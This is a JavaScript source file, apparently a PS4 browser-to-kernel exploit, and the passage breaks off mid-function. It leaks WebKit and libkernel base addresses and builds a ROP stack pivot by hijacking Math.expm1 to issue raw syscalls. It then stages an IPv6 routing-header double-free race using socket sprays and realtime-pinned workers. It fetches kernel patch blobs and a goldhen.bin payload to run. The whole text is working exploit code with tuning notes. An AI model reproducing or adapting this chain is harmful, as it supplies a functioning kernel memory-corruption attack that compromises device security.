var allDone = false;
(async function () {
  var p = null;
  try {
    var NUM_IOV_WORKER = params.has("iov") ? parseInt(params.get("iov"), 10) : 4;
    var NUM_ATTEMPT = params.has("attempts") ? parseInt(params.get("attempts"), 10) : 8;
    var NUM_IOV_SPRAY = params.has("spray") ? parseInt(params.get("spray"), 10) : 0x100;
    var {
      key,
      off
    } = offsetsFor(navigator.userAgent);
    mark("FW", key || "(not a PS4 UA)");
    if (!off) {
      state("no offsets for this firmware", "bad");
      return;
    }
    mark("FW-STATUS", off.fw_status || "none");
    mark("PLAN", "iov_workers=" + NUM_IOV_WORKER + " attempts=" + NUM_ATTEMPT + " spray=" + NUM_IOV_SPRAY + " mode=" + (STOP_BEFORE_DOUBLE ? "stop-before-double" : "armed"));
    var kpatch = null,
      payload = null;
    // off.kpatch wins when a firmware shares another's kernel and therefore
    // its blob -- 12.02 uses 1200.bin. Otherwise derive it from the key.
    var kpatchName = off && off.kpatch ? "patches/" + off.kpatch : key ? "patches/" + key.replace(".", "") + ".bin" : null;
    var KPATCH_JMP_SITES = [];
    try {
      if (kpatchName) {
        var r = await fetch(kpatchName);
        if (r.ok) kpatch = new Uint8Array(await r.arrayBuffer());
      }
    } catch (e) {
      mark("KPATCH-FETCH-THREW", e.message);
    }
    if (kpatch) {
      for (var i = 0; i + 7 <= kpatch.length; ++i) {
        if (kpatch[i] !== 0xc6 || kpatch[i + 1] !== 0x81) continue;
        if (kpatch[i + 6] !== 0xeb) continue;
        KPATCH_JMP_SITES.push((kpatch[i + 2] | kpatch[i + 3] << 8 | kpatch[i + 4] << 16 | kpatch[i + 5] << 24) >>> 0);
      }
    }
    mark("KPATCH-BLOB", kpatch ? "blob=" + kpatchName + " bytes=" + kpatch.length + " sites=" + KPATCH_JMP_SITES.length : "blob=" + kpatchName + " MISSING");
    try {
      var _r = await fetch("../goldhen.bin");
      if (_r.ok) payload = new Uint8Array(await _r.arrayBuffer());
    } catch (e) {
      mark("PAYLOAD-FETCH-THREW", e.message);
    }
    mark("PAYLOAD-BLOB", payload ? "bytes=" + payload.length + " entry=" + (payload[0] === 0xe9 ? "e9-jmp-rel32" : "NOT-e9") : "MISSING");
    state("running the primitive...", "warn");
    await new Promise(function (r) {
      return setTimeout(r, 0);
    });
    var PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS/i;
    var carrier = await establishPrimitive({
      maxAttempts: 6,
      onEvent: function (t, d, a) {
        return (PRIMITIVE_LOUD.test(t) ? mark : trace)(t, (a != null ? "[" + a + "] " : "") + (d || ""));
      }
    });
    // THE EXPERIMENT. Promotion releases the ~137 MB the OOM is made of --
    // proven: PAIR-UP released=13 on 2026-08-16 14:44. But releaseFakeCell()
    // only NULLS references; it does not free anything. It converts 137 MB
    // of quiet pinned memory into 137 MB of garbage and leaves the sweep to
    // JSC, which last time chose to run it somewhere inside the triple-free
    // race ~500 ms later (cr_refcnt-driven-1 rounds=256, twice).
    //
    // So: release it HERE, then make the collection happen HERE too, before
    // a single worker or kernel object exists.
    // OPT-IN, not opt-out. Promotion releases the ~137 MB -- but releasing
    // is not freeing: it turns quiet pinned memory into garbage that JSC
    // collects whenever it chooses, including mid-race. The sweep below was
    // meant to force that collection at a safe point and MEASURABLY DOES
    // NOT: 21 consecutive runs logged worst_cycle_ms 67-83 against a 60 ms
    // floor, i.e. a few ms of overhead and no full collection anywhere.
    // Until the sweep can be shown to actually collect, the pinned profile
    // is the safer one. ?pair=1 to experiment.
    var PAIR_ON = params.get("pair") === "1";
    var SWEEP_CYCLES = params.has("sweep") ? parseInt(params.get("sweep"), 10) : 6;
    var SWEEP_MS = params.has("sweepms") ? parseInt(params.get("sweepms"), 10) : 60;
    var SWEEP_MB = params.has("sweepmb") ? parseInt(params.get("sweepmb"), 10) : 8;
    installWindowP(carrier, {
      promote: PAIR_ON,
      onEvent: function (t, d) {
        return (PRIMITIVE_LOUD.test(t) ? mark : trace)(t, d || "");
      }
    });
    if (!window.p) throw new Error("window.p was not installed");
    p = window.p;
    mark("PAIR-STATUS", "state=" + pairStatus.state + " promoted=" + pairStatus.promoted + " stage=" + pairStatus.stage + (pairStatus.failedAt ? " failedAt=" + pairStatus.failedAt : "") + (pairStatus.error ? " error=" + pairStatus.error : ""));

    // Provoke the collection. globalThis.gc does not exist in a shipping
    // WebProcess (core.js:368 guards for it and never fires), so the only
    // levers are allocation pressure and turning the event loop -- the
    // incremental sweeper cannot run while we hold the thread.
    //
    // OBSERVABLE: worst_cycle_ms. A cycle much longer than floor_ms is a
    // collection landing here instead of on the race. If every cycle sits
    // at the floor, nothing was swept and this experiment did nothing.
    if (pairStatus.promoted && SWEEP_CYCLES > 0) {
      state("sweeping...", "warn");
      var t0 = Date.now();
      var worst = 0;
      for (var _i = 0; _i < SWEEP_CYCLES; ++_i) {
        var c0 = Date.now();
        var junk = [];
        for (var k = 0; k < SWEEP_MB; ++k) junk.push(new ArrayBuffer(0x100000));
        junk.length = 0;
        junk = null;
        await new Promise(function (r) {
          return setTimeout(r, SWEEP_MS);
        });
        var dt = Date.now() - c0;
        if (dt > worst) worst = dt;
      }
      mark("SWEEP", "cycles=" + SWEEP_CYCLES + " mb=" + SWEEP_MB + " floor_ms=" + SWEEP_MS + " worst_cycle_ms=" + worst + " total_ms=" + (Date.now() - t0));
    } else {
      mark("SWEEP-SKIPPED", "promoted=" + pairStatus.promoted + " cycles=" + SWEEP_CYCLES);
    }
    mark("PRIMITIVE-OK", "");
    var cell = p.leakval(Math.expm1);
    var nativeFn = p.read8(p.read8(cell.add32(0x18)).add32(off.wk_JSFunction_m_function));
    var webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
    var errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
    var libkernelBase = errorFn.sub32(off.k__error);
    mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase);
    var aligned = function (v) {
      return v.hi > 0 && (v.low & 0x3fff) === 0;
    };
    if (!check("module-bases-0x4000-aligned", aligned(webkitBase) && aligned(libkernelBase), "")) return;
    var G = {};
    var GAD = [["POP_RDI_RET", off.wk_POP_RDI_RET, [0x5f, 0xc3]], ["POP_RSI_RET", off.wk_POP_RSI_RET, [0x5e, 0xc3]], ["POP_RDX_RET", off.wk_POP_RDX_RET, [0x5a, 0xc3]], ["POP_RCX_RET", off.wk_POP_RCX_RET, [0x59, 0xc3]], ["POP_R8_RET", off.wk_POP_R8_RET, [null, 0x58, 0xc3]], ["POP_R9_RET", off.wk_POP_R9_RET, [null, 0x59, 0xc3]], ["POP_RAX_RET", off.wk_POP_RAX_RET, [0x58, 0xc3]], ["LEAVE_RET", off.wk_LEAVE_RET, [0xc9, 0xc3]], ["MOV_RDI_RAX_RET", off.wk_MOV_QWORD_PTR_RDI_RAX_RET, [0x48, 0x89, 0x07, 0xc3]], ["G0", off.wk_MOV_RDI_RSI_30_CALL, [0x48, 0x8b, 0x7e, 0x30]], ["G1", off.wk_POP_RAX_MOV_RAX_JMP_18, [0x58, 0x48, 0x8b, 0x07]], ["G2", off.wk_PUSH_RBP_MOV_RBP_RSP_10, [0x55, 0x48, 0x89, 0xe5]], ["G3", off.wk_MOV_RDI_RAX_8_CALL_20, [0x48, 0x8b, 0x78, 0x08]], ["G4", off.wk_MOV_RDX_RAX_18_CALL_10, [0x48, 0x8b, 0x50, off.pivot_view_sp]], ["G5", off.wk_PUSH_RDX_POP_RSP_RET, [0x52, 0x5c, 0xc3]]];
    var gated = 0;
    for (var [nm, rva, pat] of GAD) {
      var a = webkitBase.add32(rva);
      var good = true;
      for (var _i2 = 0; _i2 < pat.length; ++_i2) {
        if (pat[_i2] === null) continue;
        if (p.read1(a.add32(_i2)) !== pat[_i2]) {
          good = false;
          break;
        }
      }
      if (good) {
        G[nm] = a;
        gated++;
      } else mark("GADGET-BAD", nm);
    }
    if (!check("gadget-table-fits-module", gated === GAD.length, gated + "/" + GAD.length)) return;
    var argGadget = [G.POP_RDI_RET, G.POP_RSI_RET, G.POP_RDX_RET, G.POP_RCX_RET, G.POP_R8_RET, G.POP_R9_RET];
    var stubAddr = new Map();
    var seeded = 0;
    if (off.k_stubs) {
      for (var numStr in off.k_stubs) {
        var num = +numStr,
          o = off.k_stubs[numStr];
        var v = p.read8(libkernelBase.add32(o));
        if ((v.low & 0x00ffffff) !== 0xc0c748 || v.hi >>> 24 !== 0x49) continue;
        if ((v.low >>> 24 | (v.hi & 0x00ffffff) << 8) >>> 0 !== num) continue;
        stubAddr.set(num, libkernelBase.add32(o));
        seeded++;
      }
    }
    var need = new Set(Object.keys(SYS).map(function (k) {
      return SYS[k];
    }).filter(function (n) {
      return !stubAddr.has(n);
    }));
    var scanned = 0;
    for (var _o = 0; _o < off.k_scan_stage1 && need.size; _o += 16) {
      var _v = p.read8(libkernelBase.add32(_o));
      if ((_v.low & 0x00ffffff) !== 0xc0c748 || _v.hi >>> 24 !== 0x49) continue;
      var _num = (_v.low >>> 24 | (_v.hi & 0x00ffffff) << 8) >>> 0;
      if (!need.has(_num)) continue;
      stubAddr.set(_num, libkernelBase.add32(_o));
      need.delete(_num);
      scanned++;
    }
    mark("STUBS", "seeded=" + seeded + " scanned=" + scanned);
    var miss = Object.keys(SYS).filter(function (k) {
      return !stubAddr.has(SYS[k]);
    });
    if (!check("syscall-page-needs-stub", miss.length === 0, miss.join(","))) return;
    function bufAddr(ab) {
      var c = p.leakval(ab);
      return p.read8(p.read8(c.add32(off.wk_ArrayBuffer_m_impl)).add32(off.wk_ArrayBuffer_m_contents_m_data));
    }
    function put(dv, at, v) {
      if (typeof v === "number") {
        dv.setUint32(at, v >>> 0, true);
        dv.setUint32(at + 4, v < 0 ? 0xffffffff : 0, true);
      } else {
        dv.setUint32(at, v.low >>> 0, true);
        dv.setUint32(at + 4, v.hi >>> 0, true);
      }
    }
    var PB_SIZE = Math.max(0x28, off.pivot_view_sp + 8 + 0xf & ~0xf);
    function makeCtx() {
      var sb = new ArrayBuffer(0x20),
        pb = new ArrayBuffer(PB_SIZE);
      var kb = new ArrayBuffer(0x2000),
        fb = new ArrayBuffer(0x40);
      chainKeepAlive.push(sb, pb, kb, fb);
      var c = {
        storeDv: new DataView(sb),
        pivotDv: new DataView(pb),
        stackDv: new DataView(kb),
        frameDv: new DataView(fb),
        stackU8: new Uint8Array(kb),
        frameU8: new Uint8Array(fb)
      };
      chainKeepAlive.push(c.storeDv, c.pivotDv, c.stackDv, c.frameDv, c.stackU8, c.frameU8);
      c.S = bufAddr(sb);
      c.P = bufAddr(pb);
      c.K = bufAddr(kb);
      c.F = bufAddr(fb);
      put(c.storeDv, 0x00, G.G1);
      put(c.storeDv, 0x08, c.P);
      put(c.storeDv, 0x10, G.G3);
      put(c.storeDv, 0x18, G.G2);
      put(c.pivotDv, 0x00, c.P);
      put(c.pivotDv, 0x10, G.G5);
      put(c.pivotDv, 0x20, G.G4);
      return c;
    }
    function layout(c, target, args) {
      c.stackU8.fill(0);
      c.frameU8.fill(0);
      var insts = [];
      for (var _i3 = 0; _i3 < args.length; ++_i3) {
        insts.push(argGadget[_i3]);
        insts.push(args[_i3]);
      }
      var targetIdx = insts.length;
      insts.push(target);
      insts.push(G.POP_RDI_RET);
      insts.push(c.F);
      insts.push(G.MOV_RDI_RAX_RET);
      insts.push(G.POP_RAX_RET);
      insts.push(JSVALUE_UNDEFINED);
      insts.push(G.LEAVE_RET);
      var at = 0x2000 - 8 * insts.length;
      if ((c.K.low + at + 8 * targetIdx & 0xf) !== 0) at -= 8;
      for (var _i4 = 0; _i4 < insts.length; ++_i4) put(c.stackDv, at + 8 * _i4, insts[_i4]);
      put(c.pivotDv, off.pivot_view_sp, c.K.add32(at));
    }
    var M = makeCtx();
    mainMf = p.read8(cell.add32(0x18)).add32(off.wk_JSFunction_m_function);
    mainOrig = p.read8(mainMf);
    var pivotObj = {};
    chainKeepAlive.push(pivotObj);
    var pivotCell = p.leakval(pivotObj);
    p.write8(mainMf, G.G0);
    mainArmed = true;
    function callAddr(target, args) {
      layout(M, target, args);
      var saved = p.read8(pivotCell);
      p.write8(pivotCell, M.S);
      Math.expm1(pivotObj);
      p.write8(pivotCell, saved);
      return {
        lo: M.frameDv.getUint32(0, true),
        hi: M.frameDv.getUint32(4, true),
        i32: M.frameDv.getUint32(0, true) | 0
      };
    }
    var sc = function (num, ...a) {
      return callAddr(stubAddr.get(num), a);
    };
    function errno() {
      var r = callAddr(errorFn, []);
      var a = new int64(r.lo, r.hi);
      return a.hi === 0 && a.low === 0 ? -1 : p.read4(a) | 0;
    }
    var pid = sc(SYS.getpid).i32;
    check("chain-reaches-kernel", pid > 0, "pid=" + pid + " uid=" + sc(SYS.getuid).i32);
    var scratchAb = new ArrayBuffer(0x1000);
    chainKeepAlive.push(scratchAb);
    var scratch = bufAddr(scratchAb);
    var argAb = new ArrayBuffer(8);
    chainKeepAlive.push(argAb);
    var argAddr = bufAddr(argAb),
      argDv = new DataView(argAb);
    var lenAb = new ArrayBuffer(8);
    chainKeepAlive.push(lenAb);
    var lenAddr = bufAddr(lenAb),
      lenDv = new DataView(lenAb);
    var sprayAb = new ArrayBuffer(UCRED_SIZE);
    chainKeepAlive.push(sprayAb);
    var sprayAddr = bufAddr(sprayAb),
      sprayDv = new DataView(sprayAb);
    var leakAb = new ArrayBuffer(UCRED_SIZE);
    chainKeepAlive.push(leakAb);
    var leakAddr = bufAddr(leakAb),
      leakDv = new DataView(leakAb);
    // R2. getsockopt(IPV6_RTHDR) can copy out FEWER bytes than asked, and
    // every reader below then parses whatever the PREVIOUS call left in the
    // buffer. poops.js:1849 uses the same 0xee sentinel. Filling only the
    // requested window keeps this proportional to the copy already being
    // made -- this runs inside the spray loops.
    var leakU8 = new Uint8Array(leakAb);
    var R2_ON = params.get("r2") !== "0";
    var shortReads = 0;

    // ITEM 6(a). THE BURN LIST. After a double free, the sockets whose
    // rthdr aliases the freed ucred must never be touched again. The lethal
    // operation is setRthdr: on a socket that already owns an rthdr it is a
    // free-then-realloc, so re-spraying a burned socket FREES the aliased
    // chunk and leaves the other owner dangling. freeRthdr and close are
    // equally fatal. A burned fd is therefore excluded from every spray,
    // every scan, and the teardown close -- until kernel R/W can repair it.
    var burned = new Set();
    function burn(fd, why) {
      if (fd > 0 && !burned.has(fd)) {
        burned.add(fd);
        mark("BURNED", "fd=" + fd + " why=" + why + " total=" + burned.size);
      }
    }
    function buildRthdr(dv, size) {
      var n = Math.floor((size - IP6_RTHDR0_SIZE) / IN6_ADDR_SIZE);
      new Uint8Array(dv.buffer).fill(0);
      dv.setUint8(0, 0);
      dv.setUint8(1, n * 2);
      dv.setUint8(2, 0);
      dv.setUint8(3, n);
      return IP6_RTHDR0_SIZE + IN6_ADDR_SIZE * n;
    }
    var sprayLen = buildRthdr(sprayDv, UCRED_SIZE);
    var setRthdr = function (s) {
      return sc(SYS.setsockopt, s, IPPROTO_IPV6, IPV6_RTHDR, sprayAddr, sprayLen).i32;
    };
    var freeRthdr = function (s) {
      // ITEM 6(a) chokepoint. The other guards filter at SELECTION time
      // (findTwins/findTriplet never hand back a burned fd). This is the
      // structural one: even if a future edit lets a burned fd through,
      // the free that would make it a double free cannot happen.
      if (burned.has(s)) {
        mark("FREERTHDR-REFUSED", "fd=" + s + " is burned");
        return -1;
      }
      return sc(SYS.setsockopt, s, IPPROTO_IPV6, IPV6_RTHDR, 0, 0).i32;
    };

    // `need` = the highest byte offset the CALLER will actually parse. A
    // copyout shorter than that is reported as -1 rather than handing back
    // the previous call's bytes. No mark() here -- this is a hot path; the
    // count is reported once at make_karw.
    function getRthdr(s, size, need) {
      if (R2_ON) leakU8.fill(0xee, 0, size);
      lenDv.setUint32(0, size, true);
      var rv = sc(SYS.getsockopt, s, IPPROTO_IPV6, IPV6_RTHDR, leakAddr, lenAddr).i32;
      if (rv !== 0) return -1;
      var got = lenDv.getUint32(0, true);
      if (R2_ON && need !== undefined && got < need) {
        shortReads++;
        return -1;
      }
      return got;
    }
    function netevent(sock, event) {
      argDv.setUint32(0, sock >>> 0, true);
      argDv.setUint32(4, 0, true);
      var r = sc(SYS.netcontrol, -1, event, argAddr, 8).i32;
      return {
        rv: r,
        err: r === -1 ? errno() : 0
      };
    }
    var iovAb = new ArrayBuffer(IOVEC_SIZE * NUM_MSG_IOV);
    var msgAb = new ArrayBuffer(MSGHDR_SIZE);
    chainKeepAlive.push(iovAb, msgAb);
    var iovAddr = bufAddr(iovAb),
      msgAddr = bufAddr(msgAb);
    var iovDv = new DataView(iovAb),
      msgDv = new DataView(msgAb);
    new Uint8Array(iovAb).fill(0);
    put(iovDv, 0, 1);
    put(iovDv, 8, 1);
    new Uint8Array(msgAb).fill(0);
    put(msgDv, 0x10, iovAddr);
    msgDv.setInt32(0x18, NUM_MSG_IOV, true);
    state("setting up...", "warn");
    if (sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, argAddr).i32 === -1) throw new Error("socketpair failed");
    var iovSs = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
    if (sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, argAddr).i32 === -1) throw new Error("uio socketpair failed");
    var uioSs = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
    mark("IOV-SS", "iov=" + iovSs.join(",") + " uio=" + uioSs.join(","));
    if (sc(SYS.pipe, argAddr).i32 === -1) throw new Error("master pipe failed");
    var masterPipe = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
    if (sc(SYS.pipe, argAddr).i32 === -1) throw new Error("slave pipe failed");
    var slavePipe = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
    check("karw-pipe-pairs-exist", masterPipe[0] > 0 && masterPipe[1] > 0 && slavePipe[0] > 0 && slavePipe[1] > 0, "master " + masterPipe + "  slave " + slavePipe);
    var dummyAb = new ArrayBuffer(0x1000);
    chainKeepAlive.push(dummyAb);
    new Uint8Array(dummyAb).fill(0x41);
    var dummyAddr = bufAddr(dummyAb);
    var uioIovAb = new ArrayBuffer(IOVEC_SIZE * NUM_UIO_IOV);
    chainKeepAlive.push(uioIovAb);
    var uioIovAddr = bufAddr(uioIovAb),
      uioIovDv = new DataView(uioIovAb);
    new Uint8Array(uioIovAb).fill(0);
    put(uioIovDv, 0, dummyAddr);
    var ipv6 = [];
    for (var _i5 = 0; _i5 < NUM_IPV6_SOCK; ++_i5) {
      var s = sc(SYS.socket, AF_INET6, SOCK_STREAM, 0).i32;
      if (s === -1) break;
      ipv6.push(s);
    }
    check("reclaim-sockets-open", ipv6.length === NUM_IPV6_SOCK, ipv6.length + "/" + NUM_IPV6_SOCK);
    function makeRpc(w, name) {
      var seq = 0;
      var pending = new Map();
      w.onmessage = function (e) {
        var d = e.data || {};
        var slot = pending.get(d.id);
        if (!slot) return;
        pending.delete(d.id);
        if (slot.timer) clearTimeout(slot.timer);
        if (d.type === "err") slot.reject(new Error(String(d.value)));else slot.resolve(d.value);
      };
      w.onerror = function (e) {
        return mark("WORKER-ONERROR", name + " " + (e && e.message ? e.message : String(e)));
      };
      return function call(fname, timeoutMs, ...args) {
        return new Promise(function (resolve, reject) {
          var id = seq++;
          var timer = timeoutMs > 0 ? setTimeout(function () {
            pending.delete(id);
            reject(new Error(name + ": timeout waiting for " + fname));
          }, timeoutMs) : null;
          pending.set(id, {
            resolve,
            reject,
            timer
          });
          w.postMessage({
            id: id,
            name: fname,
            args: args
          });
        });
      };
    }
    function ptrish(v) {
      return v.hi > 0 && v.hi < 0x10000 && (v.low & 7) === 0;
    }
    var NUM_UIO_WORKER = params.has("uio") ? parseInt(params.get("uio"), 10) : 4;
    var TOTAL_WORKERS = NUM_IOV_WORKER + NUM_UIO_WORKER;
    state("bringing up " + TOTAL_WORKERS + " workers...", "warn");
    for (var _i6 = 0; _i6 < TOTAL_WORKERS; ++_i6) {
      var name = (_i6 < NUM_IOV_WORKER ? "iov" : "uio") + (_i6 < NUM_IOV_WORKER ? _i6 : _i6 - NUM_IOV_WORKER);
      var w = {
        name: name,
        armed: false,
        wired: false
      };
      workers.push(w);
      w.worker = new Worker("rpc_worker.js");
      w.rpc = makeRpc(w.worker, name);
      if ((await w.rpc("ping", 15000)) !== "pong") throw new Error(name + " did not answer ping");
      var sLo = (0x10100000 | _i6) >>> 0,
        sHi = (0xc0de0000 | _i6) >>> 0;
      var arr = await w.rpc("init", 15000, sLo, sHi);
      chainKeepAlive.push(arr);
      var D = bufAddr(arr.buffer);
      if (p.read4(D) >>> 0 !== sLo) throw new Error(name + ": transfer did not preserve the store");
      var storage = p.read8(D.add32(0x10));
      var mc = ptrish(storage) ? p.read8(storage.add32(8)) : null;
      if (!mc || !ptrish(mc)) throw new Error(name + ": walk failed");
      var bf = p.read8(mc.add32(8));
      var wm = null,
        wv = null,
        wl = null;
      for (var _k = 1; _k <= 8; ++_k) {
        var val = p.read8(bf.sub32(8 * _k));
        if (!ptrish(val)) continue;
        var inl = p.read8(val.add32(0x10));
        var len = p.read4(val.add32(0x18)) >>> 0;
        if (inl.hi === 0 && inl.low === 2) {
          if (!wl) wl = val;
        } else if (inl.hi > 0 && len === 6) {
          if (!wm) wm = val;
        } else if (inl.hi > 0 && len === 0x30) {
          if (!wv) wv = val;
        }
      }
      if (!(wm && wv && wl)) throw new Error(name + ": shapes not found");
      w.master = wm;
      w.origVector = p.read8(wm.add32(0x10));
      p.write8(wm.add32(0x10), wv);
      w.wired = true;
      await w.rpc("setup", 15000, wl.low, wl.hi);
      await w.rpc("armPivot", 15000, G.G0.low, G.G0.hi);
      w.armed = true;
      w.ctx = makeCtx();
    }
    check("worker-came-arw", workers.length === TOTAL_WORKERS, workers.length + "/" + TOTAL_WORKERS);
    var iovWorkers = workers.slice(0, NUM_IOV_WORKER);
    var uioWorkers = workers.slice(NUM_IOV_WORKER);
    mark("WORKER-POOLS", "iov=" + iovWorkers.length + " uio=" + uioWorkers.length);
    var prioAb = new ArrayBuffer(8),
      maskAb = new ArrayBuffer(0x10);
    chainKeepAlive.push(prioAb, maskAb);
    var prioAddr = bufAddr(prioAb),
      maskAddr = bufAddr(maskAb);
    var prioDv = new DataView(prioAb),
      maskDv = new DataView(maskAb);
    new Uint8Array(maskAb).fill(0);
    sc(SYS.cpuset_getaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID, new int64(0xffffffff, 0xffffffff), 0x10, maskAddr);
    savedMask = new int64(maskDv.getUint32(0, true), maskDv.getUint32(4, true));
    prioDv.setUint16(0, 0xffff, true);
    prioDv.setUint16(2, 0xffff, true);
    sc(SYS.rtprio_thread, RTP_LOOKUP, 0, prioAddr);
    savedPrio = [prioDv.getUint16(0, true), prioDv.getUint16(2, true)];
    async function restoreThreadAttrs(why) {
      if (attrsRestored || !savedMask || !savedPrio) return;
      attrsRestored = true;
      var ID = new int64(0xffffffff, 0xffffffff);

      // MAIN THREAD FIRST. attrsRestored is latched at the top of this
      // function, so a death anywhere below leaves main realtime-256 on
      // MAIN_CORE AND makes the finally's retry a permanent no-op -- the
      // console then refuses to power off. The 16 worker RPCs used to run
      // first, and that is the exact shape of run #52 (SOCKETS-CLOSED,
      // nothing after). POOPS.LUA:1253-1257 restores ONLY the calling
      // thread and never touches a worker; we cannot copy that (our
      // workers outlive the page) but we can copy the ordering.
      // Widen affinity before dropping priority, never the reverse.
      new Uint8Array(maskAb).fill(0);
      maskDv.setUint32(0, savedMask.low, true);
      maskDv.setUint32(4, savedMask.hi, true);
      var ar = sc(SYS.cpuset_setaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID, ID, 0x10, maskAddr).i32;
      prioDv.setUint16(0, savedPrio[0], true);
      prioDv.setUint16(2, savedPrio[1], true);
      var pr = sc(SYS.rtprio_thread, RTP_SET, 0, prioAddr).i32;
      new Uint8Array(maskAb).fill(0);
      sc(SYS.cpuset_getaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID, ID, 0x10, maskAddr);
      var backMask = new int64(maskDv.getUint32(0, true), maskDv.getUint32(4, true));
      prioDv.setUint16(0, 0xffff, true);
      prioDv.setUint16(2, 0xffff, true);
      sc(SYS.rtprio_thread, RTP_LOOKUP, 0, prioAddr);
      var backPrio = [prioDv.getUint16(0, true), prioDv.getUint16(2, true)];
      var good = backMask.low === savedMask.low && backMask.hi === savedMask.hi && backPrio[0] === savedPrio[0] && backPrio[1] === savedPrio[1];
      mark("THREAD-ATTRS-RESTORED", "at=" + why + " affinity=" + ar + " rtprio=" + pr + " mask=" + backMask + " prio={" + backPrio + "} wanted=" + savedMask + " {" + savedPrio + "}");
      check("thread-attrs-restored-power-off-safe", good, "");

      // Workers last, reported separately. By here main is already
      // restored AND verified, so if these 16 RPCs never come back the
      // console can still be shut down normally.
      var wr = 0,
        wn = 0;
      for (var _w of workers) {
        try {
          if (!_w.armed) continue;
          wn++;
          new Uint8Array(maskAb).fill(0xff);
          await fireW(_w, SYS.cpuset_setaffinity, [CPU_LEVEL_WHICH, CPU_WHICH_TID, ID, 0x10, maskAddr], 5000);
          prioDv.setUint16(0, RTP_PRIO_NORMAL, true);
          prioDv.setUint16(2, 0, true);
          await fireW(_w, SYS.rtprio_thread, [RTP_SET, 0, prioAddr], 5000);
          wr++;
        } catch (e) {}
      }
      mark("WORKER-ATTRS-RESTORED", "at=" + why + " n=" + wr + "/" + wn);
    }
    restoreCtx = {
      restore: restoreThreadAttrs
    };
    mark("THREAD-ATTRS-SAVED", "mask=" + savedMask + " rtprio={" + savedPrio + "}");
    prioDv.setUint16(0, RTP_PRIO_REALTIME, true);
    prioDv.setUint16(2, RTP, true);
    new Uint8Array(maskAb).fill(0);
    maskDv.setUint32(0, 1 << MAIN_CORE, true);
    {
      var _a = sc(SYS.cpuset_setaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID, new int64(0xffffffff, 0xffffffff), 0x10, maskAddr).i32;
      var _r2 = sc(SYS.rtprio_thread, RTP_SET, 0, prioAddr).i32;
      check("main-thread-pinned-realtime", _a === 0 && _r2 === 0, "core=" + MAIN_CORE + " rtp=" + RTP + " affinity=" + _a + " rtprio=" + _r2);
    }
    function fireW(w, num, args, timeoutMs) {
      layout(w.ctx, stubAddr.get(num), args);
      return w.rpc("fire", timeoutMs === undefined ? 15000 : timeoutMs, w.ctx.S.low, w.ctx.S.hi);
    }
    for (var _w2 of workers) {
      await fireW(_w2, SYS.cpuset_setaffinity, [CPU_LEVEL_WHICH, CPU_WHICH_TID, new int64(0xffffffff, 0xffffffff), 0x10, maskAddr]);
      await fireW(_w2, SYS.rtprio_thread, [RTP_SET, 0, prioAddr]);
    }
    mark("WORKERS-PINNED", "n=" + workers.length + " core=" + MAIN_CORE + " rtp=" + RTP);
    function tagFor(i) {
      return (RTHDR_TAG | i & 0xffff) >>> 0;
    }
    function readTag() {
      var v = leakDv.getUint32(4, true) >>> 0;
      return {
        ok: (v & 0xffff0000) >>> 0 === RTHDR_TAG,
        idx: v & 0xffff
      };
    }
    // Sized from the constant, not 256: an undefined slot reads as falsy and
    // would make findTwins skip every socket, i.e. silently never find a twin.
    var sprayOk = new Array(NUM_IPV6_SOCK).fill(false);
    function findTwins(timeout) {
      for (var round = 0; round < timeout; ++round) {
        for (var _i7 = 0; _i7 < ipv6.length; ++_i7) {
          // ITEM 6(a). Re-setting a burned socket frees the chunk it
          // aliases. sprayOk stays false so the read loop skips it too.
          if (burned.has(ipv6[_i7])) {
            sprayOk[_i7] = false;
            continue;
          }
          sprayDv.setUint32(4, tagFor(_i7), true);
          // R2. A failed set (ENOBUFS) leaves this socket owning the
          // PREVIOUS tag. Trusting it can fabricate a twin pair, and
          // freeRthdr(twins.b) then frees a chunk another socket owns.
          sprayOk[_i7] = setRthdr(ipv6[_i7]) === 0;
        }
        for (var _i8 = 0; _i8 < ipv6.length; ++_i8) {
          if (R2_ON && !sprayOk[_i8]) continue;
          if (getRthdr(ipv6[_i8], IP6_RTHDR0_SIZE, 8) < 0) continue;
          var t = readTag();
          if (t.ok && t.idx !== _i8 && t.idx < ipv6.length && (!R2_ON || sprayOk[t.idx])) return {
            a: ipv6[_i8],
            b: ipv6[t.idx],
            round: round
          };
        }
        if ((round + 1) % 50 === 0) sc(SYS.sched_yield);
      }
      return null;
    }
    function findTriplet(master, slave, tag, timeout) {
      var rounds = timeout || MAX_ROUNDS_TRIPLET;
      var seen = [];
      var untagged = 0;
      for (var round = 0; round < rounds; ++round) {
        for (var _i9 = 0; _i9 < ipv6.length; ++_i9) {
          if (ipv6[_i9] === master || ipv6[_i9] === slave) continue;
          if (burned.has(ipv6[_i9])) continue; // ITEM 6(a)
          sprayDv.setUint32(4, tagFor(_i9), true);
          setRthdr(ipv6[_i9]);
        }
        var t = getRthdr(master, IP6_RTHDR0_SIZE, 8) < 0 ? {
          ok: false,
          idx: 0
        } : readTag();
        if (!t.ok) untagged++;
        var fd = t.ok && t.idx < ipv6.length ? ipv6[t.idx] : -1;
        if (seen.length < 6) seen.push(t.ok ? t.idx + "->fd" + fd : "untagged");
        if (fd !== -1 && fd !== master && fd !== slave && !burned.has(fd)) {
          // ITEM 6(a)

          (/^(RE|UW)/.test(tag) ? trace : mark)("TRIPLET-" + tag, "round=" + round + " fd=" + fd + " untagged=" + untagged);
          return fd;
        }
        if ((round + 1) % 100 === 0) sc(SYS.sched_yield);
      }
      mark("TRIPLET-" + tag + "-MISS", "master=" + master + " slave=" + slave + " rounds=" + rounds + " untagged=" + untagged + "  first reads: " + seen.join(" "));
      return 0;
    }
    var bootErr = "";
    function bootFingerprint() {
      var nameAb = new ArrayBuffer(8),
        outAb = new ArrayBuffer(0x10);
      chainKeepAlive.push(nameAb, outAb);
      var nameAddr = bufAddr(nameAb),
        outAddr = bufAddr(outAb);
      var nameDv = new DataView(nameAb);
